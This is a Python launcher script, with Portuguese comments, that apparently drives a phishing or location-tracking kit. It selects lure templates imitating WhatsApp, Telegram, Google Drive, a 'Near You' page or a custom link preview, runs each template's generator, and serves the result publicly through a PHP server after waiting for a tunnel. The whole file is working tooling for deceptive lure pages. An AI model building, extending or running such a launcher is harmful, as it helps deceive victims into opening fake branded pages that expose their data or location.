#!/usr/bin/env python3
import os
import sys
import time
import subprocess
import argparse

# Constantes de Cores
R = '\033[31m'
G = '\033[32m'
C = '\033[36m'
W = '\033[0m'

def log_debug(message):
    if not os.path.exists("logs"): os.makedirs("logs")
    with open("logs/debug_template.txt", "a") as f:
        f.write(f"{time.strftime('%H:%M:%S')} - {message}\n")
    print(message)

def run_php_server(path):
    log_debug(f"Aguardando estabilização do túnel (5s)...")
    time.sleep(5)
    log_debug(f"Iniciando servidor PHP em {path} na porta 8080...")
    cmd = f"php -S 0.0.0.0:8080 -t {path} > /dev/null 2>&1"
    os.system(cmd)

def find_script_smart(base_template_dir, specific_folder, possible_names):
    search_paths = []
    for name in possible_names:
        search_paths.append(os.path.join(base_template_dir, name))
        search_paths.append(os.path.join(specific_folder, name))
    for path in search_paths:
        if os.path.exists(path): return path
    return None

def main():
    if os.path.exists("logs/debug_template.txt"):
        try: os.remove("logs/debug_template.txt")
        except: pass

    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--template', type=int, help='ID do Template')
    args = parser.parse_args()
    template_id = args.template

    if template_id is None:
        log_debug("Erro: ID do template não fornecido.")
        sys.exit(1)

    base_template_dir = "template"
    target_html_folder = ""
    generator_scripts = []
    
    # --- SELEÇÃO DE TEMPLATE ---
    if template_id == 1: # NEAR YOU
        target_html_folder = os.path.join(base_template_dir, "nearyou")
        generator_scripts = ["mod_nearyou.py", "nearyou.py"]
        log_debug(f"Modo: Near You (ID {template_id})")

    elif template_id == 2: # WHATSAPP
        target_html_folder = os.path.join(base_template_dir, "whatsapp")
        generator_scripts = ["mod_whatsapp.py", "whatsapp.py"]
        log_debug(f"Modo: WhatsApp (ID {template_id})")
        
    elif template_id == 3: # TELEGRAM
        target_html_folder = os.path.join(base_template_dir, "telegram")
        generator_scripts = ["mod_telegram.py", "telegram.py"]
        log_debug(f"Modo: Telegram (ID {template_id})")

    elif template_id == 4: # GOOGLE DRIVE
        target_html_folder = os.path.join(base_template_dir, "gdrive")
        generator_scripts = ["mod_gdrive.py", "gdrive.py"]
        log_debug(f"Modo: Google Drive (ID {template_id})")

    elif template_id == 5: # CUSTOM OG
        target_html_folder = os.path.join(base_template_dir, "custom_og")
        # Lista atualizada para incluir mod_custom_og_tags.py
        generator_scripts = ["mod_custom_og_tags.py", "mod_custom_og.py", "custom_og.py"]
        log_debug(f"Modo: Custom Link (ID {template_id})")
    
    else:
        log_debug(f"Erro: Template ID {template_id} não suportado.")
        sys.exit(1)

    # 1. LOCALIZAR O SCRIPT
    generator_path = find_script_smart(base_template_dir, target_html_folder, generator_scripts)
    
    if not generator_path:
        log_debug(f"CRÍTICO: Não encontrei o script python na pasta {target_html_folder}!")
    else:
        log_debug(f"Script de template encontrado: {generator_path}")
        
        try:
            # Executa o gerador do template
            result = subprocess.run(['python3', generator_path], capture_output=True, text=True)
            if result.returncode == 0:
                 log_debug("Sucesso! Template atualizado.")
                 
                 # Verifica e corrige nome do index se necessário
                 final_html_path = os.path.join(target_html_folder, "index.html")
                 if not os.path.exists(final_html_path):
                     template_name = target_html_folder.split('/')[-1]
                     possible_name = os.path.join(target_html_folder, template_name + ".html")
                     if os.path.exists(possible_name):
                         os.rename(possible_name, final_html_path)
            else:
                log_debug(f"ERRO ao rodar script (Código {result.returncode})")
                log_debug(f"Detalhe: {result.stderr}")
        except Exception as e:
            log_debug(f"Exceção: {e}")

    # 4. SERVIDOR
    try:
        run_php_server(target_html_folder)
    except KeyboardInterrupt:
        log_debug("Servidor interrompido.")

if __name__ == "__main__":
    main()